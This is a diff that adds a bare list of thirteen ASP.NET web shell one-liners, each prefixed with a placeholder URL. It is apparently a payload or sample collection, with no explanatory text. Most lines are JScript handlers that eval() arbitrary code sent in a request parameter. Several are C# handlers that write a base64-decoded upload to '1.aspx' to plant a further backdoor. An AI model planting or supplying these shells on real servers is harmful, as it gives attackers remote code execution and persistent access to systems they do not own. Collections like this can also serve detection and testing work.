@@ -1,0 +1,13 @@
+http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*dvnbs*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["Ananas"],"unsafe");}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["Load"],"unsafe");}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["gttkomomo"],"unsafe");}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request.Item["8db0b1f583b6e61211b11791475341a5"])),"unsafe");}</script>
+http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*kncbm*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["klk123456"],"unsafe");}</script>
+http://g/<script language="JScript" runat="server">function Page_Load(){eval(Request["A!C!h3r0"],"unsafe");}</script>
+http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*awnhp*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
+http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*wxbif*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["Web.Config.aspx@2021"],"unsafe");}</script>
+http://f/<script language="JScript" runat="server">function Page_Load(){eval(Request["dE24MplWcGfz"],"unsafe");}</script>
+http://f/<Script Language= "C#" Runat= "Server">public void Page_Load(){/*blnos*/System.IO.File.WriteAllBytes(Server.MapPath("1.aspx"),System.Convert.FromBase64String(Request.Form["a"].Substring(3)));}</script>
